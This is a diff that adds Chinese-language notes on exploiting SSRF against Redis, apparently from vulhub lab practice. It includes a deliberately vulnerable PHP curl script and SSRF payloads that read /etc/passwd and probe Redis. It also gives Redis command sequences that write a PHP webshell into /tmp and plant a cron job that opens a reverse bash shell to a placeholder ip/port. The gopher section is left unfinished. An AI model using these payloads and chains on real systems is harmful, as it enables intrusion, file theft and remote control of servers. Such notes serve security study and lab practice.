@@ -198,3 +198,96 @@ for i in raw:
     }
 ```
 
+# SSRF-Redis
+
+```
+redis登录后临时修改密码
+config set requirepass 123456
+```
+
+```php
+<?php
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $_GET['url']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_exec($ch);
+curl_close($ch);
+?>
+```
+
+## http协议
+
+`?url=http://httpbin.org/get`
+
+![](https://img.mi3aka.eu.org/2022/09/50781955f2026fae0ed3232cb86ec775.png)
+
+## file协议
+
+`?url=file:///etc/passwd`
+
+![](https://img.mi3aka.eu.org/2022/09/1f89037b77aa5fa68aca85981816e17b.png)
+
+## dict协议
+
+`?url=dic://ip:port/info`查看当前redis的相关配置
+
+![](https://img.mi3aka.eu.org/2022/09/12556d9b5aba426f39a018259c821e29.png)
+
+>如果提示`NOAUTH Authentication required`则说明需要密码
+
+![](https://img.mi3aka.eu.org/2022/09/374c5d41904f6c7c8bd73c88fbce4e79.png)
+
+![](https://img.mi3aka.eu.org/2022/09/d0c59e91d2224a54d6c0d4bace65a187.png)
+
+对于存在认证的redis无法利用dict协议进行攻击,因为dict每次只能传输单行数据(单条完整指令)
+
+---
+
+>攻击链条如下
+
+1. 写webshell
+
+```
+flushall
+config set dir /tmp
+config set dbfilename shell.php
+set:webshell:"\x3C\x3fphp\x20phpinfo\x28\x29\x3b\x3f\x3e"
+用\x3f代替?避免写入出错
+save
+```
+
+![](https://img.mi3aka.eu.org/2022/09/11cfa900e3cf423bac805391e4a65917.png)
+
+![](https://img.mi3aka.eu.org/2022/09/5f6840bad2e6365f0e3a2a334e340e12.png)
+
+2. 反弹shell
+
+```
+flushall
+config set dir /etc/cron.d
+config set dbfilename re
+set:a:"\n\n\x2a/1 \x2a \x2a \x2a \x2a root /bin/bash -i \x3e\x26 /dev/tcp/ip/port 0\x3e\x261\n\n"
+save
+```
+
+![](https://img.mi3aka.eu.org/2022/09/240d207dc87560d255b27a81642b125e.png)
+
+>vulhub的redis都是基于debian的,只有centos的cron能够无视错误语句运行
+
+3. 主从复制
+
+>todo
+
+## gopher协议
+
+1. 协议格式
+
+格式里面的特殊字符'_'不一定是它也可以是其他特殊字符,因为gopher协议默认会吃掉一个字符
+`gopher://<host>:<port>/<gopher-path>_`后接TCP数据流
+
+如果发起post请求,回车换行需要使用`%0d%0a`,如果存在多个参数,参数之间的`&`也需要进行URL编码
+
+2. 协议通信
+
+![](https://img.mi3aka.eu.org/2022/09/31a0defb4141aa37ab7218a9788d6c82.png)
+
